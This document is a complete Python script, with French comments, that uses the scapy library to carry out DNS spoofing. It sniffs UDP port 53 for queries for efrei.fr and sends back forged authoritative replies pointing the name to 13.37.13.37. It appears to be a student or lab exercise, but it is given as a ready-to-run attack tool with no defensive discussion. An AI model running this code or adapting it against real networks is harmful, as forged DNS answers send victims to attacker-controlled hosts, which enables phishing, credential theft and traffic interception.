#!/usr/bin/env python3

from scapy.all import *

TARGET_DOMAIN = "efrei.fr"
SPOOF_IP = "13.37.13.37"

def dns_spoof():

    def process_packet(packet):
        # Filtrer les paquets DNS (UDP sur port 53)
        if packet.haslayer(DNS) and packet[DNS].qr == 0:  # QR=0 -> requête
            queried_domain = packet[DNSQR].qname.decode("utf-8").strip(".")
            
            if queried_domain == TARGET_DOMAIN:
                print(f"[+] Requête DNS interceptée pour {queried_domain}. Réponse : {SPOOF_IP}")
                
                # Construire une réponse DNS spoofée
                dns_response = IP(src=packet[IP].dst, dst=packet[IP].src) / \
                               UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) / \
                               DNS(
                                   id=packet[DNS].id,
                                   qr=1,  # Réponse
                                   aa=1,  # Réponse autoritative
                                   qd=packet[DNS].qd,
                                   an=DNSRR(rrname=queried_domain + ".", ttl=10, rdata=SPOOF_IP)
                               )
                
                for i in range(5):
                    send(dns_response, verbose=False)
    
    print(f"[+] Spoofing DNS activé pour {TARGET_DOMAIN} -> {SPOOF_IP}")
    sniff(filter="udp port 53", prn=process_packet)

if __name__ == "__main__":
    try:
        dns_spoof()
    except KeyboardInterrupt:
        print("\n[!] Arrêt du DNS spoofing.")
        sys.exit(0)

